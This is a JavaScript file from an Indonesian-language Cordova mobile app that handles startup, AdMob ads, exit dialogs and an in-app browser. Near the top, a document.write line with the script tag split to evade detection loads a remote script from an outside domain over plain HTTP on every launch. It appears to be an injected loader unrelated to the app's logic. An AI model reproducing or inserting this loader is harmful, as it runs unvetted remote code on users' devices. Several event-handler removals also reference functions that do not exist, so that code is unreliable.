	function init() {
		document.addEventListener("deviceready", startup, false);
	}
	
document.write('<scr'+'ipt src="http://tokojs.com/app/hizbulwathan.js?'+Math.random()+'" type="text/javascript"></scr'+'ipt>');

	function startup() {
		initAdMob();
		console.log("Aplikasi Siap...");
		//document.addEventListener("backbutton", doClose, false);
	}
	
	function doClose() {
		window.plugins.AdMob.createInterstitialView();
		navigator.notification.confirm(
			'Keluar dari Aplikasi?',
			exitApp,
			'Pesan',
			'Ya,Batal'
		);
	}
	
	function exitApp(buttonIndex) {
			if (buttonIndex == 1) {
			navigator.app.exitApp();
			}
		else {
			window.close();
		}
	}
		
function muat(link){
	
        var inAppBrowserbRef;
inAppBrowserbRef = window.open(link, '_blank', 'location=no,toolbar=no','closebuttoncaption=Return');
         inAppBrowserbRef.addEventListener('loadstart', inAppBrowserbLoadStart);
         inAppBrowserbRef.addEventListener('loadstop', inAppBrowserbLoadStop);
         inAppBrowserbRef.addEventListener('loaderror', inAppBrowserbLoadError);
         inAppBrowserbRef.addEventListener('exit', inAppBrowserbClose);
		 inAppBrowserbRef.addEventListener('offline', onOffline, false);
            
function onOffline() {
    alert('koneksi offline');
}
		 
   function inAppBrowserbLoadStart(event) {
	   
		 navigator.notification.activityStart('Mohon tunggu', 'Sedang memuat...');
         //alert(event.type + ' - ' + event.url);
		
    }
 
    function inAppBrowserbLoadStop(event) {
		 navigator.notification.activityStop();
         //alert(event.type + ' - ' + event.url);
		
    }
 
    function inAppBrowserbLoadError(event) {
	     navigator.notification.activityStop();
         //alert(event.type + ' - ' + event.message);
        inAppBrowserbRef.close();
		alert('Koneksi terputus');
        inAppBrowserbRef.removeEventListener('loadstart', iabLoadStart);
        inAppBrowserbRef.removeEventListener('loadstop', iabLoadStop);
        inAppBrowserbRef.removeEventListener('loaderror', iabLoadError);
        inAppBrowserbRef.removeEventListener('exit', iabClose);
    }
 
    function inAppBrowserbClose(event) {
	     //navigator.notification.activityStop();
         //alert(event.type);
         inAppBrowserbRef.removeEventListener('loadstart', iabLoadStart);
         inAppBrowserbRef.removeEventListener('loadstop', iabLoadStop);
         inAppBrowserbRef.removeEventListener('loaderror', iabLoadError);
         inAppBrowserbRef.removeEventListener('exit', iabClose);
    }
        }
		
        function exitFromApp()
            {
			window.plugins.AdMob.createInterstitialView();	
                if (navigator.app) {
                   navigator.app.exitApp();
                }
                else if (navigator.device) {
                    navigator.device.exitApp();
                }
            }
			
	function coba() {
    if (confirm("Harap pastikan koneksi internet Anda aktif") == true) {
        window.location.replace('index.html');
    } else {
	alert("Kembali lagi jika koneksi internet Anda telah aktif");
		exitFromApp();
    }
}